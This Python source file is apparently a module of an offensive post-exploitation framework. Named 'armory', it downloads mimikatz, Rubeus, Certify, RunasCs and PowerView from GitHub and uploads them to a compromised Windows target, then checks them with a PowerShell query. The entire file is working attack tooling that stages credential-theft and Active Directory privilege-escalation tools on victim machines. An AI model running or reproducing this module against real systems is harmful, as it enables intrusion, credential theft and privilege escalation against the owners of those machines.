from __future__ import annotations

import io
import time
import zipfile

from koi.modules.blueprint import KoiModule
from koi.utils.cache import cache_path, fetch_or_cache
from koi.utils.ui import alert, accent

MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
MIMIKATZ_ZIP_CACHE_NAME = "armory_mimikatz_trunk.zip"

TOOLS: dict[str, str] = {
    "Rubeus.exe":      "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Rubeus.exe",
    "RunasCs.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/RunasCs.exe",
    "Certify.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Certify.exe",
    "PowerView.ps1":   "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1",
}


class PopulateWinModule(KoiModule):
    name        = "armory"
    description = "Upload common exploitation tools (Rubeus, RunasCs, Certify, mimikatz, PowerView) on the target."
    usage       = "armory <id> [-o <remote_dir>]"
    category    = "Privilege Escalation"
    platform    = "windows_ps"
    arguments   = [
        {
            "flags":   ["-o", "--output-dir"],
            "default": None,
            "help":    "Remote directory where tools will be saved (default: current directory)",
        },
    ]
    external_resources = [
        {
            "name":      name,
            "url":       url,
            "cache_key": f"armory_{name}",
        }
        for name, url in TOOLS.items()
    ] + [
        {
            "name":      "mimikatz_trunk.zip",
            "url":       MIMIKATZ_ZIP_URL,
            "cache_key": MIMIKATZ_ZIP_CACHE_NAME,
        },
    ]
    def _fetch_mimikatz_exe(self) -> tuple[bytes, str]:
        """Download mimikatz_trunk.zip and return the x64/mimikatz.exe bytes."""
        zip_bytes, source = fetch_or_cache(MIMIKATZ_ZIP_URL, MIMIKATZ_ZIP_CACHE_NAME)
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            return zf.read("x64/mimikatz.exe"), source

    def run(self) -> None:
        out_dir = (self.args.output_dir or ".").rstrip("\\")

        self.status(f"Populating {out_dir} with exploitation tools...")
        print()

        results: dict[str, str] = {}
        uploaded_files: dict[str, tuple[str, str]] = {}  # {name: (dest, source)}

        for name, url in TOOLS.items():
            dest = f"{out_dir}\\{name}"
            cache_name = f"armory_{name}"
            with self.spinner(f"Fetching and uploading {name}..."):
                try:
                    raw, source = fetch_or_cache(url, cache_name)
                    ok  = self._upload_bytes(raw, dest)
                    if ok:
                        time.sleep(1.0)
                        uploaded_files[name] = (dest, source)
                    else:
                        results[name] = "FAILED"
                except Exception as exc:
                    results[name] = f"error: {exc}"

        dest = f"{out_dir}\\mimikatz.exe"
        with self.spinner("Downloading mimikatz..."):
            source = "remote"
            try:
                raw, source = self._fetch_mimikatz_exe()
                ok  = self._upload_bytes(raw, dest)
                if ok:
                    time.sleep(1.0)
                    uploaded_files["mimikatz.exe"] = (dest, source)
                else:
                    results["mimikatz.exe"] = "FAILED"
            except Exception as exc:
                results["mimikatz.exe"] = f"error: {exc}"

        # Batch-verify all uploaded files in one query
        if uploaded_files:
            with self.spinner("Verifying uploads..."):
                paths_expr = "@(" + ",".join(
                    f"'{self._ps_quote(d)}'" for d, _ in uploaded_files.values()
                ) + ")"
                verify_raw = self._win_query(f"({paths_expr} | ForEach-Object {{(Test-Path $_).ToString()}}) -join '{self.REC_SEP}'")
                exists_list = [x.strip().lower() == "true" for x in verify_raw.split(self.REC_SEP)]

            for (name, (dest, source)), exists in zip(uploaded_files.items(), exists_list):
                if source == "cache":
                    cache_name = f"armory_{name}" if name != "mimikatz.exe" else MIMIKATZ_ZIP_CACHE_NAME
                    self.ok(f"Using cached {name} ({cache_path(cache_name)})")
                results[name] = dest if exists else "FAILED"

            # Safety net: if the batched query returned fewer entries than
            # expected (truncated output), don't silently drop those tools.
            for name in uploaded_files:
                if name not in results:
                    results[name] = "FAILED"

        display = {}
        for name, val in results.items():
            if val == "FAILED" or val.startswith("error"):
                display[name] = alert(val)
            else:
                display[name] = accent(val)

        print()
        self.box("armory results", display)
